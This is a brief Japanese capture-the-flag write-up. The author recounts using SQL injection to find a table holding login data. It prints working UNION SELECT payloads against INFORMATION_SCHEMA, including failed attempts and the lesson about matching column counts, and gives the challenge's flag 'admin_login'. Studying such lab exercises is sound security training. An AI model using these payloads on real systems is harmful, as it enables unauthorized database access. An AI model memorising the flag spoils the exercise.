## Enum3で発見した脆弱性を利用して、ログインに必要な情報が格納されていると推測できるテーブル名を解答してください。  
  
  うわ、でた  
  'information schema'みるやつや  
  もはや綴りがあっているかすら怪しい、、、  
  そしてつまる、、、  
    
結果として実行した`injection`は以下、  
```bash
' OR 'a' = 'a' UNION SELECT TABLE_NAME,COLUMN_NAME,null FROM INFORMATION_SCHEMA.COLUMNS ;

```
  
思考としては、`INFORMATION_SCHEMA`の`Tables`か`Columns`のどっちかははっきり覚えてなかったが、まぁまずどっちかだろうという推測はすぐに立ったのだが、↓のような構文をずっと実行していて何も出力しなくて詰まってしまった。  
  
```bash
' OR true UNION SELECT * FROM INFORMATION_SCHEMA.TABLES ;
' OR true UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES ;  

```
  
`select`の`column`の数を合わせるということを完全に失念しておった。。。  
おそらく気づくのに３０分は要したな。。。  
まぁこれで***１０回死んでも忘れなくなった***のでよしとしよう  
  
### コマンド
`' OR 'a' = 'a' UNION SELECT TABLE_NAME,COLUMN_NAME,null FROM INFORMATION_SCHEMA.COLUMNS ;`  
  
### フラグ  
`admin_login`  
  
  
